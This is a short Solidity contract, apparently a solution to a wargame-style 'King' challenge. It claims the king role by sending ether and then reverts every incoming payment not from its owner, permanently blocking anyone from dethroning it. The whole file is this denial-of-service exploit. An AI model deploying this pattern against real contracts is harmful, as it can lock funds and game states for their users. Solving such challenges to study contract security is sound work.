// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Dethroner {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function becomeKing(address payable _king) public returns (bool) {
         (bool success,) = address(_king).call{value: 1000000000000000000, gas: 400000}("");
         return success;
    }

    receive() external payable {
        require(msg.sender == owner, "I will always be king");
    }
}
